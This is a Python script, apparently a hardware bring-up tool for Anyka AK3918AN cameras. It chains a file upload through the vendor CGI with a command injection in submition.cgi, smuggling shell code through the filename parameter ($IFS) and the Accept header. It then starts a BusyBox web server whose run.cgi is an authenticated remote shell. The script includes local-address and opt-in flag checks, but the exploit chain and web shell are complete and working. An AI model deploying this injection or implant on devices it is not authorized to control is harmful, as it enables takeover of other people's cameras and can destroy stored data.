#!/usr/bin/env python3
"""Anyka bring-up transport. Normal commands use a temporary, authenticated RAM server."""
import argparse
import base64
import hashlib
import http.client
import json
import os
from pathlib import Path
import re
import secrets
import shlex
import socket
import time


class Device:
    def __init__(self, host, port=80, token=None, timeout=30):
        self.host, self.port, self.token, self.timeout = host, port, token, timeout

    def request(self, method, path, body=b'', headers=None):
        headers = dict(headers or {})
        if self.token:
            credentials = base64.b64encode(f'catplay:{self.token}'.encode()).decode()
            headers['Authorization'] = f'Basic {credentials}'
        conn = http.client.HTTPConnection(self.host, self.port, timeout=self.timeout)
        try:
            conn.request(method, path, body=body, headers=headers)
            response = conn.getresponse()
            result = response.read()
            if response.status != 200:
                raise RuntimeError(f'HTTP {response.status}: {result[:200]!r}')
            return result
        finally:
            conn.close()

    def run(self, command):
        if not self.token:
            raise RuntimeError('Commands require the RAM-server session, not the stock CGI')
        marker = f'CATPLAY_RC_{secrets.token_hex(8)}:'
        script = f'(\n{command}\n)\nrc=$?\nprintf "\\n{marker}%s\\n" "$rc"\n'
        body = self.request('POST', '/cgi-bin/run.cgi', script.encode(),
                            {'Content-Type': 'text/plain'})
        match = re.search(rb'\n' + marker.encode() + rb'(\d+)\s*$', body)
        if not match:
            raise RuntimeError('RAM server did not return a command exit status')
        output = body[:match.start()]
        if int(match[1]):
            raise RuntimeError(f'Command exited {int(match[1])}: {output.decode(errors="replace")}')
        return output

    def upload(self, path, data):
        # Keep this bring-up tool from writing persistent partitions or configuration.
        if not re.fullmatch(r'/tmp/[A-Za-z0-9_.-]+', path):
            raise ValueError('Uploads must target a file directly under /tmp')
        if len(data) > 8 * 1024 * 1024:
            raise ValueError('RAM upload limit is 8 MiB')
        encoded = base64.b64encode(data).decode()
        command = f"base64 -d > {shlex.quote(path)} <<'CATPLAY_BASE64'\n{encoded}\nCATPLAY_BASE64\nmd5sum {shlex.quote(path)}"
        output = self.run(command)
        digest = hashlib.md5(data).hexdigest().encode()
        if not re.search(rb'^' + digest + rb'\s+' + re.escape(path.encode()) + rb'$', output, re.M):
            raise RuntimeError('Uploaded file checksum mismatch')
        return output


def stock_upload(device, name, data):
    """Append one chunk to a unique RAM filename; mode .1 avoids clearing /tmp."""
    if not re.fullmatch(r'cp-[a-f0-9]+\.sh', name) or len(data) > 8192:
        raise ValueError('Invalid bootstrap upload')
    def chunk(filename, payload):
        boundary = 'catplay' + secrets.token_hex(16)
        body = (f'--{boundary}\r\nContent-Disposition: form-data; name="chunk"; '
                f'filename="{filename}"\r\nContent-Type: application/octet-stream\r\n\r\n').encode()
        body += payload + f'\r\n--{boundary}--\r\n'.encode()
        return device.request('POST', '/cgi-bin/downfile.cgi', body,
                              {'Content-Type': f'multipart/form-data; boundary={boundary}'})

    result = chunk(f'{name}.1', data)
    if b'write data------success' not in result:
        raise RuntimeError(f'Bootstrap upload failed: {result[:500]!r}')
    time.sleep(0.2)
    # Finalize with an empty chunk and the expected hash. This does not execute it.
    digest = hashlib.md5(data).hexdigest()
    result = chunk(f'{name}:{digest}.2', b'')
    if b'file check success' not in result or digest.encode() not in result:
        raise RuntimeError(f'Bootstrap checksum verification failed: {result[:500]!r}')


def bootstrap(host, port, session_path, allow_stock_bootstrap):
    if not allow_stock_bootstrap:
        raise RuntimeError('Stock bootstrap clears /usr/data/lib. Explicit authorization and '
                           '--allow-stock-bootstrap are required. Normal commands do not use it.')
    if session_path.exists():
        raise RuntimeError('Session file exists; use it or choose another path')
    stock = Device(host)
    version = stock.request('GET', '/cgi-bin/getversion.cgi')
    if b'platform:AK3918AN' not in version:
        raise RuntimeError('The device did not identify as AK3918AN')
    nonce, token = secrets.token_hex(8), secrets.token_hex(24)
    root = f'/tmp/cp-{nonce}'
    name = f'cp-{nonce}.sh'
    script = f'''#!/bin/sh
set -eu
umask 077
mkdir -p {root}/www/cgi-bin
printf '%s\\n' '/:catplay:{token}' > {root}/httpd.conf
cat > {root}/www/cgi-bin/run.cgi <<'CATPLAY_CGI'
#!/bin/sh
printf 'Content-Type: application/octet-stream\\r\\n\\r\\n'
exec /bin/sh 2>&1
CATPLAY_CGI
chmod 700 {root}/www/cgi-bin/run.cgi
/bin/busybox httpd -f -p {host}:{port} -h {root}/www -c {root}/httpd.conf >{root}/httpd.log 2>&1 </dev/null &
echo $! > {root}/pid
'''
    session = dict(host=host, port=port, token=token, root=root, bootstrap=f'/tmp/{name}')
    # Persist credentials before starting the server, so a timeout remains recoverable.
    fd = os.open(session_path, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
    with os.fdopen(fd, 'w') as out:
        json.dump(session, out)
        out.write('\n')
    stock_upload(stock, name, script.encode())
    # This is the ONLY call to the destructive vendor submission handler.
    payload = f'sh${{IFS}}/tmp/{name}'
    request = ('POST /cgi-bin/submition.cgi?filename=a;sh$IFS-c$IFS$HTTP_ACCEPT;& HTTP/1.1\r\n'
               f'Host: {host}\r\nAccept: {payload}\r\nContent-Type: application/x-www-form-urlencoded\r\n'
               'Content-Length: 1\r\nConnection: close\r\n\r\nx').encode()
    with socket.create_connection((host, 80), timeout=5) as conn:
        conn.settimeout(10)
        conn.sendall(request)
        while conn.recv(65536):
            pass
    device = Device(host, port, token)
    last_error = None
    for _ in range(10):
        try:
            result = device.run('id; cat /proc/version')
            print(result.decode(errors='replace'))
            print(f'RAM server ready. Session: {session_path}')
            return
        except (OSError, RuntimeError) as error:
            last_error = error
            time.sleep(0.5)
    raise RuntimeError(f'RAM server did not start; session saved for diagnosis: {last_error}')


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--session', type=Path, default=Path('anyka-session.json'))
    sub = parser.add_subparsers(dest='action', required=True)
    p = sub.add_parser('identify', help='Read stock version information without shell execution')
    p.add_argument('--host', default='192.168.50.100')
    p = sub.add_parser('bootstrap', help='Start a RAM server; clears stock override directory')
    p.add_argument('--host', default='192.168.50.100')
    p.add_argument('--port', type=int, default=8081)
    p.add_argument('--allow-stock-bootstrap', action='store_true')
    p = sub.add_parser('run', help='Execute a command through the authenticated RAM server')
    p.add_argument('command')
    p = sub.add_parser('upload', help='Upload a file into /tmp and verify its checksum')
    p.add_argument('local', type=Path)
    p.add_argument('remote')
    sub.add_parser('stop', help='Stop the temporary server')
    args = parser.parse_args()
    if args.action == 'identify':
        print(Device(args.host).request('GET', '/cgi-bin/getversion.cgi').decode(errors='replace'))
        return
    if args.action == 'bootstrap':
        if not re.fullmatch(r'192\.168\.\d{1,3}\.\d{1,3}', args.host):
            parser.error('Bootstrap requires a local device IPv4 address')
        if not 1024 <= args.port <= 65535:
            parser.error('RAM server port must be between 1024 and 65535')
        bootstrap(args.host, args.port, args.session, args.allow_stock_bootstrap)
        return
    session = json.loads(args.session.read_text())
    device = Device(session['host'], session['port'], session['token'])
    if args.action == 'run':
        print(device.run(args.command).decode(errors='replace'))
    elif args.action == 'upload':
        print(device.upload(args.remote, args.local.read_bytes()).decode(errors='replace'))
    elif args.action == 'stop':
        root = session['root']
        if not re.fullmatch(r'/tmp/cp-[a-f0-9]+', root):
            raise ValueError('Invalid server root in session')
        print(device.run(f'kill "$(cat {root}/pid)"').decode(errors='replace'))


if __name__ == '__main__':
    main()
